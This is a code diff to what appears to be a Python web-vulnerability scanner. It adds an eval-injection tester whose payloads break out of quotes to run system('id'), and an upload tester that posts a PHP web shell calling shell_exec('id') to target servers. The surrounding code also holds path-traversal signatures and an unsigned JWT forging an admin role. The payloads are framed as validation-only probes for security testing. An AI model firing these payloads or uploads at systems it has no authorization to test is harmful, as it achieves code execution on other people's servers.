@@ -100,7 +100,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parent))
 import scope_authority as sa  # noqa: E402
 import context_router as cr  # noqa: E402
 
-VERSION = "7.5.0"
+VERSION = "8.0.0"
 SCHEMA = 4
 
 
@@ -910,6 +910,10 @@ def cmd_verify(args):
         contract = self.parent.parent / "references" / "mandates" / meta["contract"]
         if not contract.exists():
             bad.append(f"mandate contract {meta['contract']}")
+    va = subprocess.run([sys.executable, str(self.parent / "version_audit.py")],
+                        capture_output=True, text=True)
+    if va.returncode != 0:
+        bad.append(f"version audit: {va.stdout.strip() or va.stderr.strip()}")
     if len(PHASES) != 13:
         bad.append("phases != 13")
     if len(CHAIN_PATTERNS) < 8:
@@ -3443,9 +3447,11 @@ def cmd_ledger(args):
                  "| id | severity | cvss | status | class | title | asset |",
                  "|---|---|---|---|---|---|---|"]
             for r in rows:
+                title_esc = str(r.get("title", "")).replace("|", "\\|")
+                asset_esc = str(r.get("asset", "")).replace("|", "\\|")
                 L.append(f"| {r.get('id')} | {r.get('severity')} | {r.get('cvss')} |"
-                         f" {r.get('status')} | {r.get('cls')} | {str(r.get('title','')).replace('|','\\|')} |"
-                         f" {str(r.get('asset','')).replace('|','\\|')} |")
+                         f" {r.get('status')} | {r.get('cls')} | {title_esc} |"
+                         f" {asset_esc} |")
             text = "\n".join(L) + "\n"
         elif fmt == "sarif":
             text = json.dumps(_ledger_to_sarif(args.target, rows), indent=2) + "\n"
@@ -4223,6 +4229,24 @@ TESTERS = [
      "signatures": ("root:x:0:0", "root:*:0:0", "daemon:"),
      "logic": "path param never normalized — traversal escapes the web root "
               "(dot-dot · encoded · double-encoded · backslash · absolute · unicode)"},
+    {"name": "EVALBREAK", "cls": "EVALBREAK",
+     "params": ("image", "expr", "calc", "code", "template", "render",
+                "format", "eval", "action", "cmd"),
+     "attacks": lambda v: ([f"{v}';system('id');//",
+                            f'{v}";system("id");//',
+                            f"{v}';shell_exec('id');//",
+                            "${system('id')}",
+                            f"{v}'.system('id').'"]),
+     "signatures": ("uid=", "gid=", "root:", "daemon:"),
+     "logic": "input interpolated into eval'd/echo'd code — the quote "
+              "break-out executes attacker code (CWE-94/95 eval-injection "
+              "class; validation-only: id)"},
+    {"name": "FILEUPLOAD", "cls": "FILEUPLOAD",
+     "params": (),
+     "attacks": lambda v: [],
+     "signatures": ("SMRCE:uid=", "uid=", "gid="),
+     "logic": "upload path stores and executes client files — any-extension "
+              "write lands a php shell (CWE-434 class; validation-only: id)"},
     {"name": "JWT", "cls": "JWT",
      "params": ("token", "jwt", "auth", "id_token", "access_token"),
      "attacks": lambda v: (["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
@@ -5510,6 +5534,10 @@ def cmd_protect(args):
 
 _JS_PATH_RE = re.compile(
     r"""(?:fetch\(|axios[.(]|url\s*[:=]\s*|api\s*[:=]\s*)["'`](/[a-zA-Z0-9_\-./]{2,60})["'`]""")
+# v7.7.1 — JS-nav param mining: onclick="location.href='?x=1'" style targets
+# (button-driven params never appear in <a href> — vm6-class surfaces)
+_JS_NAV_RE = re.compile(
+    r"""(?:location\.href|location\.assign|window\.open)\s*[=(]\s*['"]([^'"]*\?[^'"]{0,120})['"]""")
 _FORM_INPUT_RE = re.compile(
     r"<input[^>]+name=[\"']([a-zA-Z0-9_\-]{1,40})[\"']", re.I)
 _FORM_BLOCK_RE = re.compile(r"<form\b([^>]*)>((?:(?!</form>).)*)</form>", re.I | re.S)
@@ -5571,15 +5599,20 @@ def cmd_crawl(args):
         # JS api-path mining
         for m in _JS_PATH_RE.findall(body):
             mined.append((urljoin(url, m), []))
+        # v7.7.1 — JS-nav param mining (onclick location.href targets)
+        for m in _JS_NAV_RE.findall(body):
+            mined.append((urljoin(url, m.split("?")[0]) + "?" + m.split("?", 1)[1], []))
     # dedupe into endpoint skeletons: path + ordered param names
     eps = {}
     for path, inputs in mined:
         sp = urlsplit(path)
-        if sp.path in ("/", ""):
-            continue
         params = list(dict.fromkeys(
             [k for k, _ in parse_qsl(sp.query, keep_blank_values=True)]
             + [n if isinstance(n, str) else n[0] for n in inputs]))
+        # v7.7.1 — root-path endpoints WITH params count (button-driven
+        # surfaces put every param on "/"); bare "/" stays noise
+        if sp.path in ("/", "") and not params:
+            continue
         key = sp.path
         eps[key] = sorted(set(eps.get(key, []) + params))
     endpoint_rows = []
@@ -5732,6 +5765,37 @@ def cmd_testers(args):
                                      "attack": _gate_brief(a), "url": root,
                                      "decisive": decisive, "reason": reason,
                                      "stable": True})
+                continue
+            if t["name"] == "FILEUPLOAD":
+                # v7.7.1 — the multipart special case: upload a php part that
+                # execs `id` (validation-only, read-only). The shell's output
+                # in the response = the upload executes server-side. The
+                # upload FIELD comes from the crawl's form mining when it
+                # has one (default: file).
+                field = "file"
+                for f in ctx.get("forms", []):
+                    if f.get("field") and f.get("url") == u:
+                        field = f["field"]
+                        break
+                b1 = _http(u, timeout=timeout)
+                shell = '<?php echo "SMRCE:" . shell_exec("id");?>'
+                boundary = "----SMUP"
+                body = (f"--{boundary}\r\nContent-Disposition: form-data; "
+                        f'name="{field}"; filename="sm.php"\r\n'
+                        f"Content-Type: application/x-php\r\n\r\n{shell}\r\n"
+                        f"--{boundary}--\r\n").encode()
+                a = _http(u, "POST", data=body,
+                          headers={"Content-Type":
+                                   f"multipart/form-data; boundary={boundary}"},
+                          timeout=timeout)
+                hit, decisive, reason = _tester_verdict(t, "(upload)", b1, a)
+                if hit:
+                    hits.append({"param": field, "original": "(upload)",
+                                 "payload": "php shell (id)",
+                                 "baseline": _gate_brief(b1),
+                                 "attack": _gate_brief(a), "url": u,
+                                 "decisive": decisive, "reason": reason,
+                                 "stable": True})
                 continue
             if t["name"] == "REPLAY":
                 # v5.5.0 — the idempotency differential: the SAME logical
